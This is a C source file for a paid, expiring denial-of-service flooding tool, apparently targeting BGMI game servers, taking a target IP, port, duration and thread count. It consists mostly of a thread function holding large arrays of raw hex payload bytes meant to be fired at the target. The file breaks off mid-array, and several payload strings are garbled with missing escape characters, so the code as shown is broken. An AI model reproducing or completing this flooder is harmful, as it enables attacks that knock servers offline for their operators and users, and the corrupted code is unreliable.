#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define EXPIRY_DATE "2025-10-01" // Set the expiration date (YYYY-MM-DD format)

void usage() {
    printf("Usage: ./bgmi ip port time threads\n");
    exit(1);
}

// Function to check if the file has expired
int check_expiry() {
    struct tm expiry_time = {0};
    time_t current_time, expiry_timestamp;

    // Parse the expiration date
    if (strptime(EXPIRY_DATE, "%Y-%m-%d", &expiry_time) == NULL) {
        fprintf(stderr, "Error parsing expiration date\n");
        return 1;
    }

    // Convert expiration time to timestamp
    expiry_timestamp = mktime(&expiry_time);

    // Get the current time
    time(&current_time);

    // Compare current time with the expiry date
    if (difftime(expiry_timestamp, current_time) <= 0) {
        printf("THIS IS A PAID FILE BY @SAHILMODZOWNER EXPIRED ON %s.\n", EXPIRY_DATE);
        return 1;
    }

    return 0;  // Not expired
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;

    char *payloads[] = {
       "\x02\x21\x33\xE3\x60\xCA\x76\xE3\x6E\x82\xAE\xA7\x29\xDB\x9E\x6D\x37\x0F\xA1\x78\x82\x48\x35\xC0\x4C\x12\x89\xD9\x98\xEB\xCE\x14\x37\x21\xBD\xD0\x1A\x2A\xD4\x7D\xDD\x45\xA2\xF8\xC1\x5E\x51\x8A\x19\x2F\x0C\x94\xED\xEF\x0B\x32\x8C\x7B\x9F\xA4\x16\xE3\x32\x6B\x80\xC1\x13\x8D\x1D\x39\xC5\xCC\x4D\x10\x79\x31\xEC\xAD\x42\xAF\xAE\x6C\xAF\xEE\x36\x78\xDA\x24\xEE\xEF\x80\x71\x57\x8F\xD3\x9F\x77\x7E\xB9\x6E\xD0\x0E\x54\xAD\xFC\xD4\x06\x48\x03\xC9\x76\xEB\xEA\xA7\x41\x02\xAB\x82\xC6\xAF\x33\x4E\xC0\xCF\x3D\x6A\xF8\xB2\xB9\x3B\x44\x03\x22\xF5\x56\x03\x56\x88\xE3\xFC\x11\x60\x3E\x62\x56\x0A\x8D\x7C\x5D\xD7\x0A\xDA\x9A\xD3\xE5\xD0\xA8\xC1\x09\xD1\xB2\x02\xC0\xA2\xA6\x50\xD1\x95\xA5\x8D\xFB\xAC\xE1\xA5\xCB\x98\x5E\x55\x23\x29\xD9\x9C\xC3\x90\xF4\x34\x58\x32\xBA\xF5\xDB\x78\x25\xF5\xAB\x5F\xBB\xFC\xBC\xC0\xE8\xD1\x3A\x83\x00\x5F\x72\x24\x4B\x58\xBD\xFC\xBD\xDD\xFF\x06\x3C\x90\x6B\x7A\x06\xD1\x62\xFE\x47\x21\x60\x1E\xDA\xF7\x1C\xC3\x57\x7E\x93\x58\x30\x9F\xEF\x4C\x9A\xFD\x5F\xEE\x26\xC8\xB8\x28\xBF\x62\xB3\xF2\x68\x0E\x89\xBD\x8B\x19\xD2\x86\xB5\x5C\x70\xC5\xCA\xDD\x4A\xAA\xB8\x4E\x8E\xB1\x88\xEB\x3D\xF3\x0F\x5B\x36\xB6\xEB\x8F\x4C\x8F\xE7\x2A\xE4\xA2\x92\xEE\x58\x13\x90\xA5\x7F\xB4\xCA\x5E\xE6\x88\xFE\xA6\xB0\x74\xAD\x62\xAA\xE2\xE3\xD2\xF2\x0B\xAE\x93\x2E\xA3\x23\xBA\xC9\xEB\xC6\x70\x7F\xC1\xFC\x7E\x5C\x06\xC6\xC0\xA1\xF4\x75\xD1\xBC\x58\x7F\x32\xEE\xB7\x73\xD4\xD0\x74\xA3\x50\xF8\x60\x51\x5D\xC3\x7E\x7B\x33\xA0\x3C\x75\x23\xE7\x38\x51\xE6\x14\x4F\x73\x94\xF9\x79\x67\xD9\x3D\x04\x1B\xB0\x66\xCF\xDB\x89\x89\x22\xD3\x41\xAC\x8C\x89\x14\xD8\x41\x15\x56\xC1\x11\xCC\x1F\x67\x32\x53\x90\x16\x2B\xA0\xAB\x81\x4F\x6C\x35\xDD\x10\x51\xD0\x35\x42\xEE\x19\x6C\xB9\x6E\x31\xA2\xE6\x74\x6E\x4B\xCB\x92\x5A\x43\x8C\x4F"
 
 "x92\x4E\xE3\x8C\x54\xF6\x0B\x09\x78\xD4\xE8\x67\xB8\x9D\x3B\xB1\xF9\xF2x18\x89\x92\x88\x67\xA3\xC5\x50\xAE\xF1\xF1\xA6\x25\x57\x30\x01\xE2\xCA1F\x71\xD5\xC1\x74\x70\x37\x02\x08\x18\x05\xAD\x36\x8C\xD5\xC4\x56\x20\E6\x61\xCC\x3E\x22\x14\xA3\x7C\x9B\x94\xBF\x07\x1D\x16\xAF\x87\x2B\xCF\14\xC8\x05\xFB\xC6\x78\xA9\xAD\x6C\xBA\xD0\x6D\x79\xC8\xB9\x4C\xD0\x07x0D\xDA\xF2\x4D\x6C\xE9\x7E\x56\x90\xA9\x08\xC6\xF3\xF5\x41\xBD\xC3\x8\x58\x2D\x4A\xC3\xC1\xF6\xC1\x37\x9C\x41\xAB\x36\xD1\xCB\x08\x36\x28\xA\x18\x16\xB2\x66\x4C\x0C\x7E\x01\x22\x0E\xD5\x0D\xAE\x53\xE9\xD9\x9B\xC\x15\xC0\xAB\x8C\xA6\xBE\x1F\xAD\x92\x17\x94\x9B\xFF\x38\x23\xF3\x93\x9\xB0\x05\xBE\xBA\x45\x75\xA2\x5E\x65\x0B\xDF\xB1\x81\x54\x18\xEE\x9B\x3\x14\x0C\x0E\x9B\x57\xC3\xA6\xAC\x2B\x30\x6B\x75\xB9\x76\x33\x36\x06\xE\x42\x97\xDC\x5D\x26"

"x9E\x82\x26\x0A\xCD\x7F\x4B\x6F\xCF\xB7\x7F\xB9\x7B\x16\x9D\x86\x30\x8C\x02\xE0\x19\x73\xC1\xD2\x6A\xC2\x30\x1B\xCA\x2F\x64\x62\x03\x1C\x61\x49\x0D\xA6\x38\x94\x43\xF5\x11\xD0\x06\x49\x38\x08\x46\x60\x45\xB0\x37\x32\xB8\x5C\xE6\x58\xD0\x3F\xFC\x3B\xF0\x72\x1C\x31\x7D\x5B\x1C\xBA\x45\x5B\x01\x33\x62\x10\x93\xED\xB2\x4E\xF6\xEF\x39\x6B\x9D\x05\x36\xE0\xEF\x43\x77\x6A\x9C\xD7\x6A\x89\x9F\xC0\xFB"

"\x65\xB7\xCD\x44\x1A\xB3\xEA\x19\x97\x81\x00\x69\xDC\xFF\x68\xCB\xD6\x29\xF8\x23\x74\x51\x21\xAD\x85\x96\x7C\x56\x27\x0A\xED\xC9\x73\xC4\xB7\x23\x92\x25\x33\x96\xFD\x61\xF5\xC9\x35\x65\xB0\x1B\x63\xF6\x6A\x39\xD8\x7E\x71\x5C\xF5\x87\x6E\xEE\xB7\xDE\x9E\x07\xFD\x52\x5C\x8D\x31\xDF\x53\xFD\xA3\xB8\xE2\x02\xB0\x3D\x7B\x67\xBE\x34\x62\x22\x85\x2F\xAE\xEF\x89\xC6\x9D\x23\x5A\x40\xF8\xE0\xFA\xEE\x15\xBC\xD0\x56\x11\x38\xA1\x6B\xE2\x63\x4C\xBF\xC5\x78\x14\x4A\x25\xC7\x77\x76\x6E\x90\x83\x77\xF5\x5D\x66\x59\xD9\xEF\xEF\xAA\x7C\xEE\xC1\x5C\xBB\x3B\x18\xCE\x72\xA5\x35\x18\x39\xE5\xC2\x74\x29\x15\x70\x6C\xF1\x91\x86\x15\x3D\xCC\xF9\xE3\x71\x9E\xBE\x60\x4C\x99\x7F\x1D\x80\x7F\xC2\x0D\x62\x4E\x40\x9D\x4D\x57\xC0\xB0\x51\x5C\xF5\xD9\xBF\x01\xD1\x22\x4F\x68\x9C\xA4\xBA\x6B\x01\x70\xD3\x55\x47\x5A\x6F\x1F\xB7\x5E\xD0\x1E\xAA\x59\x2B\x3F"

"\x1F\x48\xEF\x81\x2F\xE3\xFF\xA4\x2F\x94\xBB\x1F\x79\x3A\xFD\x90\xF7\xDF\x8C\x7C\x1D\x84\x18\xA0\xA2\x6A\xC8\x07\xF0\x0F\xEE\xFC\x9B\xDD\x54\xF3\x2D\x90\x94\xC8\x1E\x69\xD0\x5A\x68\x39\x23\x18\xFE\x41\x30\x49\x23\x4B\x44\x5D\x2C\x75\x62\x8F\xC5\xDC\x36\xC3\xF2\x81\x19\xA3\x07\x37\x25\x10\x96\xDF\xBB\x56\x00\xC9\xCC\x67\x3E\x14\x92\xE7\x55\x1F\x60\xFC\x18\xAF\xF0\x12\x7E\xB1\x85\x0B\xE1\x3D\xF1\x12\x77\x8C\x55\xD5\x2F\x7B\x74\x80\x43\x00\xC9\x2D\x94\x41\x8D\xB4\x96\x47\xC0\x2F\x92\x3B\xDE\x97\x04\xB5\x08\xF2\x43\x1E\xCE\x15\x00\xFF\x59\x56\xC2\x2D\x7B\xE3\x1A\x2A\xD6\xD1\x6F\x7C\xD4\xC3\x54\x29\x62\x43\x3E\x57\xFB\x1E\x4E\x8E\x7A\x1C\x0D\x5A\x27\xA3\x76\xD0\x48\x37\x66\xDE\x0C\xB7\x7D\xE8\x95\xB9\xEB\x25\x94\x0A\x8C\xEE\xD3\xAC\xF7\x60\xA0\x59\x90\x72\xDB\x02\x57\xBB\xBC\x06\x97\x5F\x02\x69\x33\x4D\x5D\x7A\x2F\xEF\x6D\xE8\xB4\xBA\x39\x53\x08\xFD\x19\xA3\xFF\x26\x17\xC3\xEC\xB4\x88\x7C\x50\xEB\x1A\x86\xDC\x07\xF5\xFB\x40\x1F\xE1\xFD\xE0\xB2\x79\x65\x15\x20\xE8\xDC\x39\xA3\x22\x2A\x2E\x3C\x35\x26\x19\xB2\x9D\x4F\xE2\xC8\x16\x68\x0D\x63\x6D\x9E\xA4\xFC\x83\x50\x45\xDC\xB4\xE0\x81\x47\xBE\xFC\x1F\x58\xC8\xC0\xA0\xF6\x64\x8B\x5C\x82\x1A\x1A\xCD\x5D\xED\xA1\x85\x5C\x81\x16\x92\x70\xF9\x1D\x9E\xA8\x88\x2B\x4F\xDE\x12\x09\xBC\x9F\x95\xB2\xCE\xB6\x26\x10\x3C\x48\xB1\x0B\xA8\x84\x55\x30\xC8\x7D\x79\xD8\xDB\xD3\xE5\x8F\x4C\x3C\x87\xA0\x35\x4A\xE2\x36\x25\x6E\xB1\xEC\xBF\x09\xCC\x57\xCA\xB3\xC5\x04\xB2\xCB\xF8\xE2\xD3\x8F\x84\xD8\x9C\x41\x54\x35\x4A\xB7\xE3\x9B\x1C\x28\x0C\x2B\x43\xAA\xC7\x23\xE1\x39\x46\xBC\xA6\xC5\x87\x82\xD8\x2F\x22\x97\xCF\x97\x3C\x37\xDD\x25\x1E\x99\xF2\x06\xE2\x8B\xCB\x86\xDE\x63\x94\xB3\x9D\xC9\x72\xDB\xB1\xA5\x5E\x50\xA9\x71\x2D\x99\x7E\x72\xC7\x4D\xFA\xE8\x2E\xF6\xB4\x39\x55\xC6\xDC\x23\x5F\x08\xFE\x7D\xA9\xD5\xD7\x30\x97\xE7\x9F\x1E\x66\x46\xAB\xF4\xBA\x56\x22\x81\x7C\xD2\x68\x80\x1E\x91\xBE\x1F\xC6\xF4\x72\xAF\x53\x73\xB9\x73\xA5\x54\x72\x34\x5E\xDC\xAA\xF5\x54\xE1\xA0\x86\xDF\xBD\xA0\x46\xFF\xFF\x32\x54\xD0\xA8\x71\x7D\xB8\x38\x1C\xF0\xC8\xAB\xAA\x1C\xCE\x72\x6B\xE9\xD4\x85\x28\xDD\xD4\x20\xB6\xCB\x94\xFC\x86\xCE\x92\xEB\x3E\x33\xB8\x0B\x38\x32\x91\x6B\x65\xDF\x19\xB9\xA4\x59\x6C\x80\xDD\xB0\xCF\xCE\x14\xB8\x11\x01\xC0\xF7\x49\x2F\x59\xCC\x1F\x80\xCE\x19\x2F\x88\x17\x96\x5F\xCC\x6E\x66\xC7\xA1\x3B\x53\x07\x01\xD6\xEB\xC0\x95\x30\x96\x40\x5F\x36\x91\x05\x91\x76\x27\x54\x35\x66\x18\x58\x14\x42\x32\x55\x88\x33\x96\x85\xD2\xA2\x46\x3"

"\xA4\xE8\x89\xA5\xCB\x2C\xEE\xED\x41\xB3\xF7\xE4\x96\x3D\x4C\x77\x0E\x8D\x1E\xC9\xFB\x5E\xDA\x54\x12\x27\x0A\x87\xC7\xB2\x1E\x40\xBF\x5E\xF9\xA3\x70\x18\xD3\x5E\xE3\x1F\x89\x08\x23\x22\x5C\x54\x47\xFE\xE1\xC0\x35\x02\x53\xAD\xBF\x22\x30\x39\xC5\xCD\x24\xBB\x39\x8C\x32\x7B\x9F\xBD\x0E\xD1\xDF\x0A\xF3\x86\x22\xE9\x24\xBA\x34\xA7\x14\x19\x09\x0A\xD8\xBD\xBF\x38\x2F\xAA\xF1\x81\xFB\x99\x36\x86\x5F\x50\x40\x1F\x2B\x3C\xBC\xCA\x56\x83\x4C\x60\x16\x22\xC7\xCE\xD4\x40\x68\x83\x87\x78\x53\xE1\xF6\x39\x28\x30\x72\xEA\x93\xD4\x07\xB6\x6A\x9F\x97\x75\x3D\x3E\xBC\x42\x34\x32\x89\x0E\xB5\x78\x5A\x29\x51\x64\x1C\x74\x71\xF5\x78\x59\xE4\xED\xBA\x4F\xBE\xD7\xC5\x4A\x48\xD6\x21\xD1\x5C\x65\x0D\x64\x3C\xCB\xB1\xAF\x72\xC8\xE9\xF1\x71\xEA\x48\x8C\x74\xC5\x85\x62\x84\x9D\x0D\x80\x1D\x32\x38\x92\x77\x00\x54\x81\x01\x85\x45\xDF\xE9\xEB\x56\x39\x47\x18\x87\x55\x65\x2F\x69\xD2\x9A\x11\x35\x22\x6C\x65\x5D\x71\xA7\xED\xE8\x08\x87\x11\x33\x0C\x13\x21\xA1\x7D\xC0\x55\x6A\xE6\x24\x5B\xF8\x5C\x01\xC4\x11\x54\xBB\x3A\x76\xC1\xC8\x28\x0B\xAF\xFD\x05\x25\x32\x70\xDF\xDC\xCC\xBF\x4D\xE2\x2C\x42\xD0\x04\xA3\xA2\x31\x41\xD1\xE6\x2F\x23\xCB\x6A\xDA\xEA\xD6\x38\xE9\x84\x7A\x29\x54\xCD\xD7\x28\x34\x29\x60\x95\x42\x66\xFA\x2E\xEC\xE2\xA9\xCE\xF4\xE6\xE0\x97\x80\x68\x61\x70\xA0\xE8\x7F\xFC\x32\x8D\xF8\xB1\x93\x7F\xA8\xC3\x91\x2B\xF4\x7F\x60\xB9\x12\x9B\x01\x7E\xA8\x20\xE8\xDD\x7C\x72\x9B\xB2\x86\x0B\xA9\xD6\x19\xD1\x7B\xE7\xD4\x41\xDB\x6D\xC1\x0B\x34\x57\xBE\x40\xC2\x7C\x84\x75\xE7\x0C\x5D\x82\x92\x1C\x9C\x01\x2B\x41\xCF\x4C\xBC\x95\x5B\x61\x22\x51\x6A\x94\x82\x6C\xBC\x93\xBF\xBF\xD3\x48\x75\x07\xD4\x80\x1F\x54\x9D\xC1\x13\x1A\x60\x1A\x9D\x73\x49\x9E\xA4\x4E\xAA\x65\x27\xF0\xD8\xAA\xBF\x96\xD6\x49\xE6\x08\x94\x9E\x0C\xF5\x6E\xB4\xA6\xA4\x92\x25\x56\x55\xF2\x5D\x97\xF9\x94\x8D\xFE\x55\xE4\x47\xD1\xA9\x3C\x77\x6C\xAB\x39\x03\xE9\x88\xE9\x2D\x4C\x36\xD8\xBC\x3D\xDB\xB0\xAE\x26\x3F\x2F\x28\xD7\x69\x03\x62\x80\x9C\x48\xA4\xD1\x4D\xD7\x9E\xFB\xBA\x44\xB9\x33\x3D\x74\xD2\xF9\x1A\x52\x9B\x01\xB6\x40\x82\x78\x0F\x5B\x99\xEE\x25\xC5\x7"

"\x86\xFD\x14\xEB\x41\xD4\xC3\x80\xAA\x4F\x57\x02\x3E\xF3\x74\x83\x45\xAF\x74\x3D\x12\x33\x87\xCC\x89\xF3\xC2\x25\x04\x79\xF7\x57\x5F\xC8\x5B\xEE\x98\xCE\xF4\x70\xF3\xD7\x0B\x48\x5B\xB9\x0E\x93\x28\x3B\xC2\xF9\x4B\xE1\xA4\x64\x34\xA2\x63\xD2\x2D\xE6\xFC\x8C\xAA\x2E\x7F\xE7\x65\xBF\x7E\x56\x5E\x7C\xD8\xC3\xF7\xA2\x03\x6B\xA3\x09\x5B\x35\x6A\xAD\x6E\x9C\x1F\x2D\xD2\xDF\x2D\x8C\xB1\xC9\xDB\xE8\xBC\x76\xC5\xC9\x06\xEF\xB1\xF1\xCF\xED\x7F\x08\x8C\x3A\x61\x57\x35\xB0\x05\xA5\xCF\x5F\x37\x26\x2B\x4C\x08\xE4\x2A\x98\xFF\x39\x19\x8A\x4C\x53\xE3\xE2\x7C\xB0\x2A\xD6\x82\xB4\x22\xA4\x69\xFB\x10\x21\xE4\xC7\x25\x63\xF3\x03\xD6\x49\x78\x2A\xA0\x3C\x99\x61\xD0\xF1\x1D\x62\x53\x57\xDB\xF4\xB0\xDB\xC6\x16\x98\x91\x16\x07\xFB\xDB\xAC\x43\xF2\xAA\x5F\xB2\x76\x00\xAA\x3A\xDB\x32\x68\x7B\xAB\xF7\x05\xE0\x28\x57\x68\x14\x2F\xF1\xD2\x0E\x41\x87\x68\xD8\xEA\xEE\xC7\xF5\x09\x6D\xAC\x00\x65\xD4\x70\x86\x43\x71\xBE\xAE\xCF\x02\x80\x67\x08\xBD\xD0\x4C\x12\x0E\x80\x17\x90\x6B\xC1\x6B\x64\x8C\x31\x38\x68\x31\x61\x0D\x84\x35\x79\x42\xD5\x24\x32\x89\x30\x10\x90\x83\xD7\xCA\x21\x83\x8B\x94\x8E\x8A\xCB\x11\x3A\x97\x1D\x80\xE6\xF9\xA2\x97\x70\xC0\xED\x2D\x77\x25\x9C\x5B\x7D\xF0\x11\x36\xD6\x79\x04\x40\x28\x13\x49\x06\x56\xED\x16\xE8\xB0\xBA\x2F\xD1\xBF\xFD\x6C\x49\xFC\x3C\x69\x01\x1C\xCA\xD7\x4D\x15\x56\x19\x17\xD7\x27\x16\x63\x72\x19\x6C\x12\x28\x52\x22\x0E\x14\xA0\x11\xAD\x58\xE6\x89\x36\x44\xF5\x59\x9D\x70\x89\x98\x17\x64\xC2\x26\x6F\x4B\x06\xA4\x35\x1A\xC3\xC0\xAC\xC1\x71\x43\xBE\x1A\xC3\xE4\x49\x5D\x30\xDA\xAF\xE7\xAA\x58\x88\xC2\xED\x1B\x22\x9F\xAE\xF8\x0D\xE1\x2F\xA6\x89\x31\x05\xA5\xA6\x4F\x19\x52\xAA\x21\x4C\xCE\x59\x9B\x49\x86\x74\x11\x12\x20\x59\x26\xC8\xEE\xB6\xBD\xD0\x36\x21\x3C\xC8\x3A\xE7\xBA\x20\x60\x78\x34\x45\xEF\x8D\x49\xD3\x5B\x1A\x20\x22\x10\xBB\x6F\x0D\x56\xF3\x5A\xCB\xC9\xD1\xC3\x88\xAD\x3F\x01\xDB\x19\xB0\x9E\x3F\x08\xA9\xBB\xAD\x89\x41\xCE\x82\x21\x76\x5C\x5E\xE6\x67\xB7\x1E\x83\xB6\x6E\x2D\x31\x4C\x25\xD3\xFB\xFD\xFB\x2B\x31\x88\x10\x50\x6D\x96\x44\x13\x53\x60\x47\x9C\xEF\xFB\x02\x7D\xFB\x21\x0B\x50\xEB\x03\x65\x29\x06"

"\xAE\xD5\x59\x2E\x78\x86\x07\x7B\x54\x64\x30\x9C\x20\x9F\x63\x33\x53\x51\x33\x18\x50\x62\xF3\x1F\x88\x69\x7D\xC5\x0E\x3A\x5B\x96\x1F\x9E\xF0\x86\xF9\xB7\x6C\x6D\xA0\x5C\xC9\xF8\x82\xD1\x00\xEB\xA2\x88\xFC\x4B\xAA\xB1\xED\x97\x04\x15\xED\x92\xE2\x1F\x8D\x56\x3B\x8B\xAE\x99\xD0\x01\xA8\x4B\xAD\x6A\xAB\x32\x7B\xF5\xD4\x08\x40\x00\x2C\x90\x1D\x7A\xA7\xD5\xA7\x5E\x7C\xA2\x9C\x59\x03\xFF\x48\xB6\x90\x4A\xA2\xF9\x01\xE8\xE2\xD7\x1A\xE3\xDB\xD1\xED\x94\xAB\xD5\xF8\xF0\x81\xAA\x75\xEB\xFE\x29\x22\x96\xB8\x88\x7E\x6B\x44\xD4\xDE\x65\xD3\x52\xC6\x28\x50\xDF\x7B\xEE\xE3\x94\x7D\x71\xCE\x47\xC0\xAA\x50\xF7\x62\x27\x16\xE7\xC5\x3F\x54\xF9\x85\x96\xD5\x77\x97\xCD\xB4\x0E\x19\x36\xE3\xC5\x32\xF1\x06\x07\x82\x27\x3C\x5F\xE9\x24\x5C\x70\xC1\xDC\x49\x7D\xA2\xAD\x02\xFB\x8B\xE0\x43\x12\xD5\xD5\x3E\xB0\x1E\x22\xC9\x60\xE2\x8C\xB5\x89\xE7\x23\x24\x29\x3C\x3C\x83\xED\xD1\xC7\x40\x93\x9F\x84\xA1\x66\x51\xF0\x57\x21\xF8\x0A\xDE\xB7\x56\xD1\x9F\x48\xDE\x56\xC9\x86\x9F\xD1\xBF\x52\x4F\x2E\xB4\xF6\x6A\x02\xDE\xE9\xBD\x06\xFE\x07\x4E\x73\x7C\x10\x43\xAC\x4D\x2F\x32\xB4\xAD\x95\xDE\xCA\xC2\xD6\xC6\xE2\xD6\xC3\xC2\x8F\x79\xB5\xE0\x18\xEC\xCE\xDC\xBA\xC0\x0E\xE7\xF6\x7B\x30\xCA\x67\xE4\x8D\x0E\x9E\x39\x4D\x72\xD7\x6F\xF1\xA3\x60\x0D\x67\x0F\x9C\x74\xB2\x79\x74\xE0\x41\xC6\x96\x93\x03\x87\xC4\x22\x09\x4F\x63\xAC\x8B\xEB\x76\xCB\x6C\xA2\x16\x78\x23\x59\x29\xC4\x6E\x4F\x31\x5B\xCC\x12\x7C\x18\xA0\x4E\xBC\x3E\x43\x43\x21\xCC\x74\x7E\xCA\x7B\x39\xDC\x20\xB4\xE9\xF8\xC1\x25\x29\x7C\x45\x24\xE1\xC7\xB8\xF9\x7C\x8D\x34\x77\x10\x7F\xE7\x98\x1E\xEC\x1D\xD0\x0B\x39\xF3\xD3\xEC\xEE\xB7\x53\xE2\x56\x8E\x03\x7E\xD0\x5F\xA3\x5C\xEB\xB7\x8A\xA0\x46\x31\x47\x1F\x26\x71\x20\xC1\x08\xEB\xF7\x92\x4F\xEC\x73\xD7\x7D\x67\xFA\x0A\x99\xC9\x64\x7D\x5A\x86\x87\xCB\x75\x19\x20\xCD\xD4\x01\x0C\x6F\xE7\x83\xC5\x52\x2F\x87\x14\x3F\x17\xEB\x5A\x0D\x7C\x77\xA1\xAA\xA9\xC3\xB1\xF1\x4D\x8A\x19\x5F\xE1\x6C\x99\xA9\xAE\x9A\xF6\xDF\x25\x9E\x14\xF3\x02\x71\xC6\x34\xBB\x50\x1E\xE4\x59\xB9\x49\x6C\x9F\xE9\x6D\xCD\x92\xC6\x6B\x8A\x6F"

"\x0A\x57\x12\x58\xB7\xC8\x86\x9F\x3B\x74\x9A\xAB\x21\x1B\xD3\x7D\x81\x6B\x87\xC3\xE5\xBB\xA7\x5C\xCA\xE2\x28\x33\xDE\x32\x2C\x60\x5F\xB7\x29\x37\x95\xCA\xAB\x39\xE9\xB3\x57\x46\x32\x56\x69\x38\xFE\xAC\x17\x7E\xB0\x1E\x41\xC0\x06\x97\x18\x53\x0F\x22\x4A\xEF\x1A\xE2\x3B\x94\xB4\xE5\x63\x45\xD6\x90\x36\xC7\x80\xB7\x2C\xEC\x06\xDD\x9B\x25\x6D\x1E\xFE\xED\xAB\xA4\x44\x2E\x34\x81\x3B\xA8\xB0\xD8\x2C\x09\xAB\x97\x05\xAC\xA6\x04\xD4\x51\xF6\xA0\x97\x2A\x58\xB8\xA9\x22\x35\xAD\xDA\x31\x28\x8B\x5A\x2C\x92\xFC\x64\x76\x92\x1F\x2A\x28\xBB\xB4\x8C\x94\xCA\x94\x8A\xEF\x8B\x7F\x32\xE6\xC3\x3D\xC2\xA9\x20\x53\xDB\x5C\x0B\x01\xB4\x9F\x42\x6E\x6A\x83\x0C\x3D\xF0\xA0\x82\xA5\x9E\x08\x77\x2E\x32\x67\xB0\xA5\x24\xBB\x72\xF4\xDA\x8A\x23\x4B\x0B\x97\x83\xE0\xD1\x2D\x89\x2E\x3A\x36\x64\xC7\x51\x3E\x82\x0C\x4E\x76\x68\xA4\x22\x50\x6C\x73\xC1\x2A\x80\x22\x78\x06\x73\x4D\x1E\x46\x9B\xF0\x80\xCD\x98\x6B\x90\xA4\x5B\xB3\xA4\xCA\xE1\xA2\xEA\x44\x98\x19\x91\xDE\xE0\xDA\x13\x3F\x49\x8B\xF0\x34\xD4\xB0\x1F\x7E\x91\xF1\xB6\x6D\x1A\xB4\x80\xE7\xF6\x72\xAD\x7E\x5D\x40\xE0\xE1\xCB\xC8\xD5\x05\xC5\x78\x45\x75\x35\x5D\x67\xF0\xF5\x66\xCC\xDB\xDE\xE3\x0F\xB6\x80\x4D\x57\x69\x93\x5E\xDB\xA8\x4C\xE5\xC0\x3E\x10\xB3\x51\xD9\xA4\x3A\x1C\x6C\x15\x98\x6E\xE0\x97\xD2\x8D\xA8\xF4\xA4\x7C\x15\xA4\x0E\xC5\xCC\x27\x40\x26\xA3\x37\xFA\xA6\x9D\xE7\xEB\x11\x96\xEE\x23\xC5\x31\xE5\x29\x5C\x57\xC0\x8E\xDF\xA8\xBB\x66\xE0\x61\x33\x35\x19\x15\xFB\xDE\x4A\xCD\xB5\x57\x7F\x21\x1C\xEF\xDA\x92\x2C\xC8\xAF\xD8\x6A\x49\x82\x5E\x00\xDB\x89\xD5\x2B\x11\x8C\xCA\x8F\x56\x1F\x67\xB5\x58\xA1\xFC\xE8\x32\x69\x3C\x1F\xFB\xFD\xA2\x06\x19\x5E\xC9\x0A\x9D\xA4\x21\xE4\x2F\x84\x1D\x6D\x87\x61\xA9\x22\x57\x2F\x46\x82\x16\xA5\x8E\x27\x66\x33\x36\x14\xE8\x6E\x25\x2E\x50\x68\xDC\xF9\x67\xD2\x54\x5E\xDD\x63\xD0\x76\x41\x15\x0B\x71\xBC\xB8\xDD\x0C\xF2\xFD\x79\x2F\xCE\xC1\xD4\x5F\x14\x2A\xEE\xC7\x07\x0E\xD3\xCE\x88\x78\x4D\xAF\x34\x43\x5A\x83\x87\x7B\x12\xAE\xA9\x54\x39\x35\x25\xF7\xC5\x84\x6E\xD6\x82\xE9\xAA\xE1\x8A\xCE\x33\x62\xDB\xF1\x9D\x69\xD2\xF9\x1F\x99\x42\x95\xF7\x55\xA8\xF8\xE9\x2C\xCC\x9B\x00\x63\x90\xCA\xA8\x6C\xD9\xD1\x46\x89\xB8\x1B\xEA\xFE\x96\x4B\xC2\x02\xBD\xB9\xF8\x93\x21\x2D\x42\xEB\x7E\x50\xB1\x84\x59\x3D\x4A\x07\x02\x76\xF2\x9F\xC5\x07\xB4\xDE\x72\xDE\x85\x04\x88\x04\x7C\x47\xC8\x19\x82\xDF\x95\x21\x32\x67\x96\x20\x3A\xC5\xF9\x81\x2E\xEB\x56\xDB\x00\xC8\x21\xE6\x91\x9A\x90\xBC\xE4\xBE\xBE\x2C\x9B\x53\x97\x39\xAA\x80\x2B\x59\xA8\xBB\x29\x96\xA7\xDD\xA9\xF6\xA9\x0F\x72\x74\x3D\x2A\xAB\xF6\xEC\xA5\x6C\x1E\xDE\xA2\x0B\x16\x33\xE2\x70\x95\x4F\xAA\xE1\xC1\x60\xBD\x66\xB2\xCF\x0D\xEE\xE3\xB3\x12\x36\xDB\xB7\x3A\x82\xF7\xBA\x8E\x5A\x0F\xFF\xC9\xE0\x6D\xD9\xD3\x2D\xD7\x14\x7E\x9C\x6B\xE4\x97\x77\x27\x93\x22\x5C\x27\xF6\xCD\x9C\xED\x9B\x7E\x70\x21\x36\x9C\x10\x81\xB7\x09\x50\xE5\x71\x50\xB2\xC1\x85\xE8\x63\x14\xDF\x15\x01\x8A\x3D\x00\x92\x7C\x5C\x59\x64\x0B\xC3\x7C\x6A\x42\xBA\xF7\xD2\x89\x9D\xEF\x22\x44\x2C\x18\x13\x33\x63\x4B\xAB\xB4\xD7\x5E\x8E\x8D\x38\x47\xA6\x51\x11\x6B\xC9\x21\x8E\xDF\xBE\xFD\xAA\x9D\x9D\x35\xA1\x43\xC1\x8B\xBA\x0A\x9B\xE4\x11\xAE\xE1\x71\xAF\xDE\x61\x69\x5C\xFF\x5B\x6F\x30\xDC\x90\x2A\xE3\xEC\xCD\x59\xA0\x3C\x8A\xB4\x40\xA3\x6B\xE4\xC4\x42\xF6\x33\x58\x31\xC0\x97\x62\x69\x23\xD6\x2B\x8F\x49\x92\x9C\x3A\xA1\x1E\x2E\x74\x38\xC8\xFE\x90\x6B\x73\x83\x1A\xE9\x1A\x49\xAA\x6E\xE5\xA0\xEB\xB7\xFE\x88\x09\xDA\xCE\xA2\x6C\x88\x5C\xB1\xA6\x56\x98\x56\xFC\x30\xFE\x45\xED\xD9\xDF\xAC\xCE\xA0\xBE\xD0\x5E\x23\x06\x20\xCE\x16\xDD\x43\x6D\x7C\xC3\x05\x91\x48\xA5\x18\x58"

